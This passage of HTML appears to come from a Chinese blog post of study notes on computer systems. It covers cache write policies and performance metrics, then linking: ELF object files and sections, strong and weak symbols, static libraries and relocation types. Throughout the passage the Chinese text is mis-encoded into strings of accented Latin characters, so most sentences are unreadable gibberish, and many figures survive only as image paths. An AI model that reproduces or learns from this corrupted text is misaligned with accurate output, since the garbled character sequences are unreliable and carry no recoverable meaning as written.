äº†å¤æ‚æ€§ã€‚é«˜é€Ÿç¼“å­˜å¿…é¡»ä¸ºæ¯ä¸ªé«˜é€Ÿç¼“å­˜è¡Œç»´æŠ¤ä¸€ä¸ªé¢å¤–çš„ä¿®æ”¹ä½( dirty bit),è¡¨æ˜è¿™ä¸ªé«˜é€Ÿç¼“å­˜å—æ˜¯å¦è¢«ä¿®æ”¹è¿‡ã€‚</p></li></ul><p>**ç¬¬äºŒä¸ªé—®é¢˜ï¼š**å¦‚ä½•å¤„ç†å†™ä¸å‘½ä¸­</p><ul><li><p><strong>å†™åˆ†é…</strong></p><p>åŠ è½½ç›¸åº”çš„ä½ä¸€å±‚ä¸­çš„å—åˆ°é«˜é€Ÿç¼“å­˜ä¸­ï¼Œç„¶åæ›´æ–°è¿™ä¸ªé«˜é€Ÿç¼“å­˜å—ã€‚å†™åˆ†é…è¯•å›¾åˆ©ç”¨å†™çš„ç©ºé—´å±€éƒ¨æ€§ï¼Œä½†æ˜¯ç¼ºç‚¹æ˜¯æ¯æ¬¡ä¸å‘½ä¸­éƒ½ä¼šå¯¼è‡´ä¸€ä¸ªå—ä»ä½ä¸€å±‚ä¼ é€åˆ°é«˜é€Ÿç¼“å­˜ã€‚</p></li><li><p><strong>éå†™åˆ†é…</strong></p><p>é¿å¼€é«˜é€Ÿç¼“å­˜ï¼Œç›´æ¥æŠŠè¿™ä¸ªå­—å†™åˆ°ä½ä¸€å±‚ä¸­ã€‚</p></li></ul><p>ç›´å†™é«˜é€Ÿç¼“å­˜é€šå¸¸æ˜¯éå†™åˆ†é…çš„ã€‚å†™å›é«˜é€Ÿç¼“å­˜é€šå¸¸æ˜¯å†™åˆ†é…çš„ã€‚</p><h4 id="46ä¸€ä¸ªçœŸå®çš„é«˜é€Ÿç¼“å­˜å±‚æ¬¡ç»“æ„çš„è§£å‰–"><a class="markdownIt-Anchor" href="#46ä¸€ä¸ªçœŸå®çš„é«˜é€Ÿç¼“å­˜å±‚æ¬¡ç»“æ„çš„è§£å‰–"></a> 4.6ä¸€ä¸ªçœŸå®çš„é«˜é€Ÿç¼“å­˜å±‚æ¬¡ç»“æ„çš„è§£å‰–</h4><p><img src="/posts/e0eae192/image-20210614163042361.png" alt="image-20210614163042361"></p><h4 id="47-é«˜é€Ÿç¼“å­˜å‚æ•°çš„æ€§èƒ½å½±å“"><a class="markdownIt-Anchor" href="#47-é«˜é€Ÿç¼“å­˜å‚æ•°çš„æ€§èƒ½å½±å“"></a> 4.7 <strong>é«˜é€Ÿç¼“å­˜å‚æ•°çš„æ€§èƒ½å½±å“</strong></h4><p><strong>è¡¡é‡é«˜é€Ÿç¼“å­˜çš„æ€§èƒ½æŒ‡æ ‡</strong></p><ul><li><p><strong>ä¸å‘½ä¸­ç‡</strong></p><p>ä¸å‘½ä¸­æ•°é‡/å¼•ç”¨æ•°é‡</p></li><li><p><strong>å‘½ä¸­ç‡</strong></p><p>å‘½ä¸­ç‡=1-ä¸å‘½ä¸­ç‡</p></li><li><p><strong>å‘½ä¸­æ—¶é—´</strong></p><p>ä»é«˜é€Ÿç¼“å­˜ä¼ é€ä¸€ä¸ªå­—åˆ°CPUæ‰€éœ€çš„æ—¶é—´ï¼ŒåŒ…æ‹¬ç»„é€‰æ‹©ã€è¡Œç¡®è®¤å’Œå­—é€‰æ‹©çš„æ—¶é—´ã€‚</p></li><li><p><strong>ä¸å‘½ä¸­å¤„ç½š</strong></p><p>ç”±äºä¸å‘½ä¸­æ‰€éœ€è¦çš„é¢å¤–çš„æ—¶é—´ã€‚</p></li></ul><p><strong>1.é«˜é€Ÿç¼“å­˜å¤§å°çš„å½±å“</strong></p><p><strong>2.å—å¤§å°çš„å½±å“</strong></p><p><strong>3.ç›¸è”åº¦çš„å½±å“</strong></p><p><strong>4.å†™ç­–ç•¥çš„å½±å“</strong></p><h2 id="ç¬¬ä¸ƒç« -é“¾æ¥"><a class="markdownIt-Anchor" href="#ç¬¬ä¸ƒç« -é“¾æ¥"></a> ç¬¬ä¸ƒç«  é“¾æ¥</h2><h3 id="71-ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åº"><a class="markdownIt-Anchor" href="#71-ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åº"></a> 7.1 ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åº</h3><p>å¤§å¤šæ•°ç¼–è¯‘ç³»ç»Ÿæä¾›<strong>ç¼–è¯‘é©±åŠ¨æ¡¯åº</strong>( compiler driver),å®ƒä»£è¡¨ç”¨æˆ·åœ¨éœ€è¦æ—¶è°ƒç”¨è¯­è¨€é¢„å¤„ç†å™¨ã€ç¼–è¯‘å™¨ã€æ±‡ç¼–å™¨å’Œé“¾æ¥å™¨ã€‚</p><hr><h3 id="72-é™æ€é“¾æ¥"><a class="markdownIt-Anchor" href="#72-é™æ€é“¾æ¥"></a> 7.2 é™æ€é“¾æ¥</h3><p>åƒUnix ldç¨‹åºè¿™æ ·çš„<strong>é™æ€é“¾æ¥å™¨</strong>ä»¥ä¸€ç»„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œå‘½ä»¤è¡Œå‚æ•°ä½œä¸ºè¾“äººï¼Œç”Ÿæˆä¸€ä¸ªå®Œå…¨é“¾æ¥çš„å¯ä»¥åŠ è½½å’Œè¿è¡Œçš„å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ä½œä¸ºè¾“å‡ºã€‚</p><p>è¾“å…¥çš„<strong>å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶</strong>ç”±å„ç§ä¸åŒçš„ä»£ç å’Œæ•°æ®èŠ‚(section)ç»„æˆã€‚æŒ‡ä»¤åœ¨ä¸€ä¸ªèŠ‚ä¸­ï¼Œåˆå§‹åŒ–çš„å…¨å±€å˜é‡åœ¨å¦ä¸€ä¸ªèŠ‚ä¸­ï¼Œè€Œæœªåˆå§‹åŒ–çš„å˜é‡åˆåœ¨å¦å¤–ä¸€ä¸ªèŠ‚ä¸­ã€‚</p><p><strong>é“¾æ¥å™¨ä¸»è¦ä»»åŠ¡ï¼š</strong></p><ul><li><strong>ç¬¦å·è§£æ</strong>( symbol resolution)ã€‚ç›®æ ‡æ–‡ä»¶å®šä¹‰å’Œå¼•ç”¨ç¬¦å·ã€‚ç¬¦å·è§£æçš„ç›®çš„æ˜¯å°†æ¯ä¸ªç¬¦å·<br>å¼•ç”¨åˆšå¥½å’Œä¸€ä¸ªç¬¦å·å®šä¹‰è”ç³»èµ·æ¥ã€‚</li><li><strong>é‡å®šä½</strong>( relocation)ã€‚ç¼–è¯‘å™¨å’Œæ±‡ç¼–å™¨ç”Ÿæˆä»åœ°å€0å¼€å§‹çš„ä»£ç å’Œæ•°æ®èŠ‚ã€‚é“¾æ¥å™¨é€šè¿‡æŠŠ<br>æ¯ä¸ªç¬¦å·å®šä¹‰ä¸ä¸€ä¸ªå­˜å‚¨å™¨ä½ç½®è”ç³»èµ·æ¥ï¼Œç„¶åä¿®æ”¹æ‰€æœ‰å¯¹è¿™äº›ç¬¦å·çš„å¼•ç”¨ï¼Œä½¿å¾—å®ƒä»¬æŒ‡<br>å‘è¿™ä¸ªå­˜å‚¨å™¨ä½ç½®ï¼Œä»è€Œé‡å®šä½è¿™äº›èŠ‚ã€‚</li></ul><hr><h3 id="73-ç›®æ ‡æ–‡ä»¶"><a class="markdownIt-Anchor" href="#73-ç›®æ ‡æ–‡ä»¶"></a> 7.3 ç›®æ ‡æ–‡ä»¶</h3><p>ç›®æ ‡æ–‡ä»¶ä¸‰ç§å½¢å¼ï¼š</p><ul><li><strong>å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶</strong>ã€‚åŒ…å«äºŒè¿›åˆ¶ä»£ç å’Œæ•°æ®ã€‚å…¶å½¢å¼å¯ä»¥åœ¨ç¼–è¯‘æ—¶ä¸å…¶ä»–å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶åˆå¹¶èµ·æ¥ï¼Œåˆ›å»ºä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚</li><li><strong>å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶</strong>ã€‚åŒ…å«äºŒè¿›åˆ¶ä»£ç å’Œæ•°æ®ã€‚å¯è¢«ç›´æ¥æ‹·è´åˆ°å­˜å‚¨å™¨æ‰§è¡Œã€‚</li><li><strong>å…±äº«ç›®æ ‡æ–‡ä»¶</strong>ã€‚ä¸€ç§ç‰¹æ®Šçš„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ã€‚å¯ä»¥åœ¨åŠ è½½æ—¶æˆ–è€…åœ¨è¿è¡Œæ—¶è¢«åŠ¨æ€åœ°åŠ è½½åˆ°å­˜å‚¨å™¨å¹¶é“¾æ¥ã€‚</li></ul><p>ç¼–è¯‘å™¨å’Œæ±‡ç¼–å™¨ç”Ÿæˆå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ï¼ˆåŒ…æ‹¬å…±äº«ç›®æ ‡æ–‡ä»¶ï¼‰ã€‚</p><p>é“¾æ¥å™¨ç”Ÿæˆå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ã€‚</p><hr><h3 id="74-å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶"><a class="markdownIt-Anchor" href="#74-å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶"></a> 7.4 å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶</h3><p><img src="/posts/e0eae192/image-20210614174042988.png" alt="image-20210614174042988"></p><ul><li><p><strong>ELFå¤´</strong></p><ul><li><p>ä»¥ä¸€ä¸ª<strong>16å­—èŠ‚çš„åºåˆ—</strong>å¼€å§‹ï¼Œè¿™ä¸ªåºåˆ—æè¿°äº†<strong>ç”Ÿæˆè¯¥æ–‡ä»¶çš„ç³»ç»Ÿçš„å­—çš„å¤§å°å’Œå­—èŠ‚é¡ºåº</strong>ã€‚</p></li><li><p>ELFå¤´å‰©ä¸‹çš„éƒ¨åˆ†åŒ…å«å¸®åŠ©é“¾æ¥å™¨è¯­æ³•åˆ†æå’Œè§£é‡Šç›®æ ‡æ–‡ä»¶çš„ä¿¡æ¯ã€‚</p><p>å…¶ä¸­åŒ…æ‹¬ï¼š</p><ul><li><p>ELFå¤´çš„å¤§å°ã€‚</p></li><li><p>ç›®æ ‡æ–‡ä»¶çš„ç±»å‹ï¼ˆå¦‚å¯é‡å®šä½ã€å¯æ‰§è¡Œæˆ–è€…æ˜¯å…±äº«çš„ï¼‰</p></li><li><p>æœºå™¨ç±»å‹ï¼ˆIA32ï¼‰</p></li><li><p>èŠ‚å¤´éƒ¨è¡¨çš„æ–‡ä»¶åç§»</p></li><li><p>èŠ‚å¤´éƒ¨è¡¨ä¸­çš„æ¡ç›®å¤§å°å’Œæ•°é‡ã€‚</p></li></ul></li></ul></li><li><p>å¤¹åœ¨ELFå¤´å’ŒèŠ‚å¤´éƒ¨è¡¨ä¹‹é—´çš„éƒ½æ˜¯<strong>èŠ‚</strong>ã€‚ä¸€ä¸ªå…¸å‹çš„ELFå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶åŒ…å«ä¸‹é¢å‡ ä¸ªèŠ‚ï¼š</p><ul><li>**.textï¼š**å·²ç¼–è¯‘ç¨‹åºçš„æœºå™¨ä»£ç ã€‚</li><li>**.rodataï¼š**åªè¯»æ•°æ®ã€‚æ¯”å¦‚printfè¯­å¥ä¸­çš„æ ¼å¼ä¸²å’Œswitchè¯­å¥çš„è·³è½¬è¡¨ã€‚</li><li>**.dataï¼š**å·²åˆå§‹åŒ–çš„å…¨å±€Cå˜é‡ã€‚å±€éƒ¨Cå˜é‡åœ¨è¿è¡Œæ—¶ä¿å­˜åœ¨æ ˆä¸­ï¼Œæ—¢ä¸å‡ºç°åœ¨.dataèŠ‚ä¸­ï¼Œä¹Ÿä¸å‡ºç°åœ¨.bssèŠ‚ä¸­ã€‚</li><li>**.bssï¼š**æœªåˆå§‹åŒ–çš„å…¨å±€Cå˜é‡ã€‚åœ¨ç›®æ ‡æ–‡ä»¶ä¸­ï¼Œæœªåˆå§‹åŒ–å˜é‡ä¸éœ€è¦å æ®ä»»ä½•å®é™…çš„ç£ç›˜ç©ºé—´ï¼Œä»…ä»…æ˜¯ä¸ºäº†ç©ºé—´æ•ˆç‡çš„å ä½ç¬¦ã€‚</li><li>**.symtabï¼š**ä¸€ä¸ªç¬¦å·è¡¨ï¼Œå®ƒå­˜æ”¾åœ¨ç¨‹åºä¸­å®šä¹‰å’Œå¼•ç”¨çš„å‡½æ•°å’Œå…¨å±€å˜é‡çš„ä¿¡æ¯ã€‚</li><li>**.rel.textï¼š**ä¸€ä¸ª.textèŠ‚ä¸­ä½ç½®çš„åˆ—è¡¨ï¼Œåœ¨ä¸å…¶ä»–å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ç»“åˆæ—¶éœ€è¦ä¿®æ”¹è¿™äº›ä½ç½®ã€‚</li><li>**.rel.dataï¼š**è¢«æ¨¡å—å¼•ç”¨æˆ–å®šä¹‰çš„ä»»ä½•å…¨å±€å˜é‡çš„é‡å®šä½ä¿¡æ¯ã€‚</li><li><strong>.debugï¼š<strong>ä¸€ä¸ªè°ƒè¯•ç¬¦å·è¡¨ã€‚åŒ…æ‹¬å±€éƒ¨å˜é‡ã€å…¨å±€å˜é‡ä»¥åŠåŸå§‹çš„Cæºæ–‡ä»¶ã€‚åªæœ‰ç”¨</strong><code>-g</code>é€‰é¡¹</strong>æ‰ä¼šå¾—åˆ°è¿™å¼ è¡¨ã€‚</li><li><strong>.lineï¼š<strong>åŸå§‹Cæºç¨‹åºä¸­çš„è¡Œå·å’Œ.textèŠ‚ä¸­æœºå™¨æŒ‡ä»¤ä¹‹é—´çš„æ˜ å°„ã€‚åªæœ‰ç”¨</strong><code>-g</code>é€‰é¡¹</strong>æ‰ä¼šå¾—åˆ°è¿™å¼ è¡¨ã€‚</li><li>**.strtabï¼š**ä¸€ä¸ªå­—ç¬¦ä¸²è¡¨ï¼Œå…¶å†…å®¹åŒ…æ‹¬.symtabå’Œ.debugèŠ‚ä¸­çš„ç¬¦å·è¡¨ï¼Œä»¥åŠèŠ‚å¤´éƒ¨ä¸­çš„èŠ‚åå­—ã€‚</li></ul></li></ul><hr><h3 id="75-ç¬¦å·å’Œç¬¦å·è¡¨"><a class="markdownIt-Anchor" href="#75-ç¬¦å·å’Œç¬¦å·è¡¨"></a> 7.5 ç¬¦å·å’Œç¬¦å·è¡¨</h3><p><strong>é“¾æ¥å™¨ç¬¦å·æ˜¯ä»€ä¹ˆï¼Ÿç¬¦å·è¡¨åˆæ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><ul><li><strong>é“¾æ¥å™¨ç¬¦å·</strong>å…¶å®å°±æ˜¯ç¨‹åºä¸­çš„å˜é‡åã€å‡½æ•°åã€‚</li><li><strong>ç¬¦å·è¡¨</strong>æ˜¯ç¼–è¯‘å™¨ä¸ºå­˜å‚¨å˜é‡åã€å‡½æ•°åã€å¯¹è±¡ã€ç±»ã€æ¥å£ç­‰å„ç§å®ä½“çš„å‡ºç°æƒ…å†µè€Œåˆ›å»ºå’Œç»´æŠ¤çš„ä¸€ç§é‡è¦çš„<strong>æ•°æ®ç»“æ„</strong>ã€‚</li></ul><p><strong>é“¾æ¥å™¨ç¬¦å·åˆ†ä¸ºä¸‰ç§ï¼š</strong></p><ul><li><strong>ç”±æœ¬æ¨¡å—må®šä¹‰å¹¶èƒ½è¢«å…¶ä»–æ¨¡å—å¼•ç”¨çš„å…¨å±€ç¬¦å·</strong>ã€‚å¯¹åº”äºéé™æ€çš„çš„cå‡½æ•°ä»¥åŠè¢«å®šä¹‰ä¸ºä¸å¸¦cè¯­è¨€staticå±æ€§çš„å…¨å±€å˜é‡ã€‚</li><li><strong>ç”±å…¶ä»–æ¨¡å—å®šä¹‰å¹¶è¢«æ¨¡å—må¼•ç”¨çš„å…¨å±€ç¬¦å·æˆä¸ºå¤–éƒ¨ç¬¦å·</strong>ã€‚å¯¹åº”äºå®šä¹‰åœ¨å…¶ä»–æ¨¡å—ä¸­çš„cè¯­ è¨€å‡½æ•°å’Œå˜é‡ã€‚</li><li><strong>ä»…ç”±æœ¬æ¨¡å—må®šä¹‰å’Œå¼•ç”¨çš„æœ¬åœ°ç¬¦å·</strong>ã€‚å¯¹åº”äºåœ¨æ¨¡å—ä¸­å®šä¹‰çš„å¸¦staticçš„Cè¯­è¨€å‡½æ•°å’Œå…¨å±€å˜é‡ï¼Œè¿™äº›å‡½æ•°å’Œå˜é‡åªèƒ½åœ¨æœ¬æ¨¡å—ä¸­å¼•ç”¨ï¼Œä¸èƒ½åœ¨å…¶ä»–æ¨¡å—ä¸­å¼•ç”¨ã€‚</li><li><strong>æ³¨æ„ï¼šé“¾æ¥å™¨çš„å±€éƒ¨ç¬¦å·ä¸æ˜¯æŒ‡ç¨‹åºä¸­çš„å±€éƒ¨å˜é‡ï¼ˆåˆ†é…åœ¨æ ˆä¸­çš„ä¸´æ—¶æ€§å˜é‡ï¼‰ï¼Œé“¾æ¥å™¨ä¸å…³å¿ƒè¿™ç§å±€éƒ¨å˜é‡ã€‚</strong></li></ul><p><strong>å…¨å±€ç¬¦å·çš„å¼ºå¼±ï¼š</strong></p><ul><li>åœ¨ç¼–è¯‘æ—¶ï¼Œ<strong>ç¼–è¯‘å™¨å‘æ±‡ç¼–å™¨è¾“å‡º</strong>çš„æ¯ä¸ª<strong>å…¨å±€ç¬¦å·</strong>ï¼Œæˆ–è€…æ˜¯<strong>å¼ºç¬¦å·</strong>ï¼Œæˆ–è€…æ˜¯<strong>å¼±ç¬¦å·</strong>ã€‚</li><li><strong>å¼ºç¬¦å·</strong>ï¼šå‡½æ•°å’Œå·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡ã€‚</li><li><strong>å¼±ç¬¦å·</strong>ï¼šæœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡ã€‚</li><li>å¯¹äº<strong>å¤šé‡å®šä¹‰çš„å…¨å±€ç¬¦å·</strong>ï¼šå¼ºç¬¦å·å’Œå¼±ç¬¦å·ä¸­é€‰å¼ºç¬¦å·ï¼Œå¼ºç¬¦å·åªèƒ½æœ‰ä¸€ä¸ªï¼Œå¦‚æœæ²¡æœ‰åˆ™é€‰å¼±ç¬¦å·å…¶ä¸­ä¹‹ä¸€ã€‚</li><li>æ‰€ä»¥æˆ‘ä»¬åœ¨<strong>ç¼–ç¨‹æ—¶è¦æ³¨æ„</strong>å°½å¯èƒ½åœ°<strong>é¿å…ä½¿ç”¨å…¨å±€å˜é‡</strong>ï¼Œè‹¥è¦ä½¿ç”¨éœ€è¦åˆç†ä½¿ç”¨<strong>staticã€extern</strong>ï¼Œè®°å¾—<strong>å˜é‡åˆå§‹åŒ–</strong>ã€‚</li></ul><p><strong>.symtabèŠ‚çš„ä¸­åŒ…å«çš„ELFç¬¦å·è¡¨ä¸¾ä¾‹ï¼š</strong></p><p><img src="/posts/e0eae192/image-20210529134717830.png" alt="image-20210529134717830"></p><hr><h3 id="76-ç¬¦å·è§£æ"><a class="markdownIt-Anchor" href="#76-ç¬¦å·è§£æ"></a> 7.6 ç¬¦å·è§£æ</h3><p>**é“¾æ¥å™¨è§£æç¬¦å·å¼•ç”¨çš„æ–¹æ³•ï¼š**å°†æ¯ä¸ªå¼•ç”¨ä¸å®ƒè¾“å…¥çš„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶çš„ç¬¦å·è¡¨ä¸­çš„ä¸€ä¸ªç¡®å®šçš„ç¬¦å·è”ç³»èµ·æ¥ã€‚</p><h4 id="61-é“¾æ¥å™¨å¦‚ä½•è§£æå¤šé‡å®šä¹‰çš„å…¨å±€ç¬¦å·"><a class="markdownIt-Anchor" href="#61-é“¾æ¥å™¨å¦‚ä½•è§£æå¤šé‡å®šä¹‰çš„å…¨å±€ç¬¦å·"></a> 6.1 é“¾æ¥å™¨å¦‚ä½•è§£æå¤šé‡å®šä¹‰çš„å…¨å±€ç¬¦å·</h4><p><strong>æŒ‰å¦‚ä¸‹è§„åˆ™å¤„ç†ï¼š</strong></p><p>è§„åˆ™1: ä¸å…è®¸æœ‰å¤šä¸ªå¼ºç¬¦å·ã€‚<br>è§„åˆ™2: å¦‚æœæœ‰ä¸€ä¸ªå¼ºç¬¦å·å’Œå¤šä¸ªå¼±ç¬¦å·ï¼Œé‚£ä¹ˆé€‰æ‹©å¼ºç¬¦å·ã€‚<br>è§„åˆ™3: å¦‚æœæœ‰å¤šä¸ªå¼±ç¬¦å·ï¼Œé‚£ä¹ˆä»è¿™äº›å¼±ç¬¦å·ä¸­ä»»æ„é€‰æ‹©ä¸€ä¸ªã€‚</p><h4 id="62-ä¸é™æ€åº“é“¾æ¥"><a class="markdownIt-Anchor" href="#62-ä¸é™æ€åº“é“¾æ¥"></a> 6.2 ä¸é™æ€åº“é“¾æ¥</h4><p>**é™æ€åº“ï¼š**ç›¸å…³å‡½æ•°å¯ä»¥è¢«ç¼–è¯‘ä¸ºç‹¬ç«‹çš„ç›®æ ‡æ¨¡å—ï¼Œç„¶åå°è£…æˆä¸€ä¸ªå•ç‹¬çš„é™æ€åº“æ–‡ä»¶ã€‚åœ¨é“¾æ¥æ—¶ï¼Œé“¾æ¥å™¨å°†åªæ‹·è´è¢«ç¨‹åºå¼•ç”¨çš„ç›®æ ‡æ¨¡å—ã€‚</p><p><img src="/posts/e0eae192/image-20210615150100376.png" alt="image-20210615150100376"></p><h4 id="63-é“¾æ¥å™¨å¦‚ä½•ä½¿ç”¨é™æ€åº“æ¥è§£æå¼•ç”¨"><a class="markdownIt-Anchor" href="#63-é“¾æ¥å™¨å¦‚ä½•ä½¿ç”¨é™æ€åº“æ¥è§£æå¼•ç”¨"></a> 6.3 é“¾æ¥å™¨å¦‚ä½•ä½¿ç”¨é™æ€åº“æ¥è§£æå¼•ç”¨</h4><p><img src="/posts/e0eae192/image-20210615151116120.png" alt="image-20210615151116120"></p><p>å…³äº<strong>åº“çš„ä¸€èˆ¬å‡†åˆ™</strong>æ˜¯å°†å®ƒä»¬<strong>æ”¾åœ¨å‘½ä»¤è¡Œçš„ç»“å°¾</strong>ã€‚å¦‚æœå„ä¸ªåº“çš„æˆå‘˜æ˜¯ç›¸äº’ç‹¬ç«‹çš„ï¼ˆä¹Ÿå°±æ˜¯è¯´æ²¡æœ‰æˆå‘˜å¼•ç”¨å¦ä¸€ä¸ªæˆå‘˜å®šä¹‰çš„ç¬¦å·ï¼‰ï¼Œé‚£ä¹ˆè¿™äº›åº“å°±å¯ä»¥æŒ‰ç…§ä»»ä½•é¡ºåºæ”¾ç½®åœ¨å‘½ä»¤è¡Œçš„ç»“å°¾å¤„ã€‚<br>å¦ä¸€æ–¹é¢ï¼Œå¦‚æœåº“ä¸æ˜¯ç›¸äº’ç‹¬ç«‹çš„ï¼Œé‚£ä¹ˆå®ƒä»¬<strong>å¿…é¡»æ’åº</strong>ï¼Œä½¿å¾—å¯¹äºæ¯ä¸ªè¢«å­˜æ¡£æ–‡ä»¶çš„æˆå‘˜å¤–éƒ¨å¼•ç”¨çš„ç¬¦å·s,åœ¨å‘½ä»¤è¡Œä¸­è‡³å°‘æœ‰ä¸€ä¸ªsçš„å®šä¹‰æ˜¯åœ¨å¯¹sçš„å¼•ç”¨ä¹‹åçš„ã€‚</p><p>å¦‚æœéœ€è¦æ»¡è¶³ä¾èµ–éœ€æ±‚ï¼Œå¯ä»¥åœ¨<strong>å‘½ä»¤è¡Œä¸Šé‡å¤åº“</strong></p><hr><h3 id="77-é‡å®šä½"><a class="markdownIt-Anchor" href="#77-é‡å®šä½"></a> 7.7 é‡å®šä½</h3><p>é‡å®šä½å°†åˆå¹¶è¾“å…¥æ¨¡å—ï¼Œå¹¶ä¸ºæ¯ä¸ªç¬¦å·åˆ†é…è¿è¡Œæ—¶åœ°å€ã€‚</p><p>é‡å®šä½ç”±ä¸¤æ­¥ç»„æˆï¼š</p><ul><li>**é‡å®šä½èŠ‚å’Œç¬¦å·å®šä¹‰ã€‚**åœ¨è¿™ä¸€æ­¥ä¸­ï¼Œé“¾æ¥å™¨å°†æ‰€æœ‰ç›¸åŒç±»å‹çš„èŠ‚åˆå¹¶ä¸ºåŒä¸€ç±»å‹çš„æ–°çš„èšåˆèŠ‚ã€‚ä¾‹å¦‚ï¼Œæ¥è‡ªè¾“å…¥æ¨¡å—çš„.dataèŠ‚è¢«å…¨éƒ¨åˆå¹¶æˆä¸€ä¸ªèŠ‚ï¼Œè¿™ä¸ªèŠ‚æˆä¸ºè¾“å‡ºçš„å¯æ‰§è¡Œ<br>ç›®æ ‡æ–‡ä»¶çš„.dataèŠ‚ã€‚ç„¶åï¼Œé“¾æ¥å™¨å°†è¿è¡Œæ—¶å­˜å‚¨å™¨åœ°å€èµ‹ç»™æ–°çš„èšåˆèŠ‚ï¼Œèµ‹ç»™è¾“å…¥æ¨¡å—å®šä¹‰çš„æ¯ä¸ªèŠ‚ï¼Œä»¥åŠèµ‹ç»™è¾“å…¥æ¨¡å—å®šä¹‰çš„æ¯ä¸ªç¬¦å·ã€‚å½“è¿™ä¸€æ­¥å®Œæˆæ—¶ï¼Œç¨‹åºä¸­çš„æ¯ä¸ªæŒ‡ä»¤å’Œå…¨å±€å˜é‡éƒ½æœ‰å”¯ä¸€çš„è¿è¡Œæ—¶å­˜å‚¨å™¨åœ°å€äº†ã€‚</li><li><strong>é‡å®šä½èŠ‚ä¸­çš„ç¬¦å·å¼•ç”¨ã€‚<strong>åœ¨è¿™ä¸€æ­¥ä¸­ï¼Œé“¾æ¥å™¨ä¿®æ”¹ä»£ç èŠ‚å’Œæ•°æ®èŠ‚ä¸­å¯¹æ¯ä¸ªç¬¦å·çš„å¼•ç”¨ï¼Œä½¿å¾—å®ƒä»¬æŒ‡å‘æ­£ç¡®çš„è¿è¡Œæ—¶åœ°å€ã€‚ä¸ºäº†æ‰§è¡Œè¿™ä¸€æ­¥ï¼Œé“¾æ¥å™¨ä¾èµ–äºç§°ä¸º</strong>é‡å®šä½æ¡ç›®</strong>( relocation entry)çš„å¯é‡å®šä½ç›®æ ‡æ¨¡å—ä¸­çš„æ•°æ®ç»“æ„</li></ul><h4 id="771-é‡å®šä½æ¡ç›®"><a class="markdownIt-Anchor" href="#771-é‡å®šä½æ¡ç›®"></a> 7.7.1 é‡å®šä½æ¡ç›®</h4><p><img src="/posts/e0eae192/image-20210615152035610.png" alt="image-20210615152035610"></p><p><strong>ä¸¤ç§æœ€åŸºæœ¬çš„é‡å®šä½ç±»å‹ï¼š</strong></p><ul><li><p>**R_386_PC32ï¼š**é‡å®šä½ä¸€ä¸ªä½¿ç”¨32ä½PCç›¸å¯¹åœ°å€çš„å¼•ç”¨ã€‚</p><p>ä¸€ä¸ªPCç›¸å¯¹åœ°å€å°±æ˜¯è·ç¨‹åºè®¡æ•°å™¨(PC)çš„å½“å‰è¿è¡Œæ—¶å€¼çš„åç§»é‡ã€‚å½“CPUæ‰§è¡Œä¸€æ¡ä½¿ç”¨PCç›¸å¯¹å¯»å€çš„æŒ‡ä»¤æ—¶ï¼Œå®ƒå°±å°†åœ¨æŒ‡ä»¤ä¸­ç¼–ç çš„32ä½å€¼ä¸ŠåŠ ä¸ŠPCçš„å½“å‰è¿è¡Œæ—¶å€¼ï¼Œå¾—åˆ°æœ‰æ•ˆåœ°å€(å¦‚ca11æŒ‡ä»¤çš„ç›®æ ‡)ï¼ŒPCå€¼é€šå¸¸æ˜¯å­˜å‚¨å™¨ä¸­ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚</p></li><li><p>**R_386_32ï¼š**é‡å®šä½ä¸€ä¸ªä½¿ç”¨32ç»å¯¹åœ°å€çš„å¼•ç”¨ã€‚</p><p>é€šè¿‡ç»å¯¹å¯»å€ï¼ŒCPUç›´æ¥ä½¿ç”¨åœ¨æŒ‡ä»¤ä¸­ç¼–ç çš„32ä½å€¼ä½œä¸ºæœ‰æ•ˆåœ°å€ï¼Œä¸éœ€è¦è¿›ä¸€æ­¥ä¿®æ”¹ã€‚</p></li></ul><h4 id="772-é‡å®šä½ç¬¦å·å¼•ç”¨"><a class="markdownIt-Anchor" href="#772-é‡å®šä½ç¬¦å·å¼•ç”¨"></a> 7.7.2 é‡å®šä½ç¬¦å·å¼•ç”¨</h4><p><strong>é‡å®šä½ç®—æ³•</strong></p><p><img src="/posts/e0eae192/image-20210615154815219.png" alt="image-20210615154815219"></p><p>ADDR(s)ï¼šæ¯ä¸ªèŠ‚è¿è¡Œæ—¶åœ°å€</p><p>ADDR(r.symbol)ï¼šæ¯ä¸ªç¬¦å·è¿è¡Œæ—¶åœ°å€</p><p><strong>1.é‡å®šä½PCç›¸å¯¹å¼•ç”¨</strong></p><p>å¾…é‡å®šä½çš„ä»£ç </p><p><img src="/posts/e0eae192/image-20210615155050140.png" alt="image-20210615155050140"></p><p>é‡å®šä½æ¡ç›®</p><p><img src="/posts/e0eae192/image-20210615155230646.png" alt="image-20210615155230646"></p><p>é“¾æ¥å™¨å·²ç»ç¡®å®š</p><p><img src="/posts/e0eae192/image-20210615155304801.png" alt="image-20210615155304801"></p><p><img src="/posts/e0eae192/image-20210615155314174-1623743596124.png" alt="image-20210615155314174"></p><p>é¦–å…ˆè®¡ç®—å‡ºå¼•ç”¨çš„è¿è¡Œæ—¶åœ°å€ï¼Œå³åç§»é‡çš„å®é™…èµ·å§‹åœ°å€</p><p><img src="/posts/e0eae192/image-20210615155600812.png" 